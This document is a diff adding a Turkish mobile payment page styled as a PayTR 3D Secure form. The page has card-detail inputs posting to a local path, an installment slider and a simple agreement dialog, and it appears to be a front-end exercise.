@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paytr 3d secure ödeme sayfası - Mobil</title>
+    <style>
+        body {
+            font-family: -apple-system, sans-serif;
+            padding: 16px;
+            background: #f1f5f9;
+        }
+
+        .card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            max-width: 420px;
+            margin: auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1.5px solid #cba5e1;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .col {
+            flex: 1;
+        }
+
+        .slider-box {
+            background: #f8fafc;
+            padding: 10px;
+            border-radius: 6px;
+            border: 1px dashed #94a3b8;
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            background: #2563eb;
+            color: white;
+            padding: 12px;
+            border: none;
+        }
+
+        dialog {
+            border: none;
+            border-radius: 12px;
+            padding: 20px;
+            max-width: 360px;
+            margin: auto;
+        }
+
+        dialog::backdrop {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+        }
+    </style>
+</head>
+
+<body>
+    <main class="card">
+        <h2>Paytr 3D Secure</h2>
+        <p style="font-size: 12px;color:#cba5e1;margin-bottom: 16px;"><strong>Tutar 1.250.00 ₺</strong></p>
+
+        <form action="/odeme" method="POST" oninput="outTaksit.value=calcMonthly(rngTaksit.value)">
+            <div class="form-group">
+                <label for="cName">Kart Sahibi:</label>
+                <input type="text" id="cName" name="card_name" required placeholder="Selahaddin ÇİFTÇİ"
+                    autocapitalize="characters">
+            </div>
+            <div class="form-group">
+                <label for="cNum">Kart Numarası:</label>
+                <input type="text" id="cNum" name="card_num" required inputmode="numeric" maxlength="19"
+                    placeholder="0000 0000 0000 0000">
+            </div>
+            <div class="row">
+                <div class="col form-group">
+                    <label for="cExp">Son Kullanma(AA/YY):</label>
+                    <input type="text" name="card_exp" id="cExp" required inputmode="numeric" maxlength="5"
+                        placeholder="12/24">
+                </div>
+                <div class="col form-group">
+                    <label for="cCvv">CVV:</label>
+                    <input type="password" name="cCvv" id="cCvv" required inputmode="numeric" maxlength="3"
+                        placeholder="***">
+
+                </div>
+            </div>
+            <div class="form-group slider-box">
+                <div
+                    style="display: flex; justify-content: space-between;font-size: 12px;font-weight: bold;margin-top: 12px;">
+                    <span>Taksit:<span id="lblTaksit">1 Taksit</span></span>
+                    <output name="outTaksit" id="outTaksit">1 x 1.250.00₺</output>
+                </div>
+                <input type="range" id="rngTaksit" min="1" max="6" value="1"
+                    oninput="document.getElementById('lblTaksit').innerText=this.value+'Taksit'">
+            </div>
+
+            <p style="font-size: 12px;margin-bottom: 14px;">
+                <a href="javascript:void(0)" onclick="document.getElementById('modalSozlesme').showModal()">3D Secure
+                    Sözleşmesi</a>'ni okudum
+            </p>
+            <button type="submit">Güvenli Ödeme Yap</button>
+        </form>
+    </main>
+    <dialog id="modalSozlesme">
+        <h4> 3d Secure Güvenlik Protokolü</h4>
+        <p style="font-size: 12px;color: black;">
+            Kart bilgileriniz bankanız tarafından 256-bit SSL tüneli üzerinden koruma altındadır.
+        </p>
+        <button onclick="document.getElementById('modalSozlesme').close()"
+            style="margin-top: 10px;width: 100%;">Kapat</button>
+    </dialog>
+    <script>
+        function calcMonthly(val) {
+            return val + ' x ' + (1250 / val).toFixed(2) + ' ₺';
+        }
+    </script>
+</body>
+
+</html>
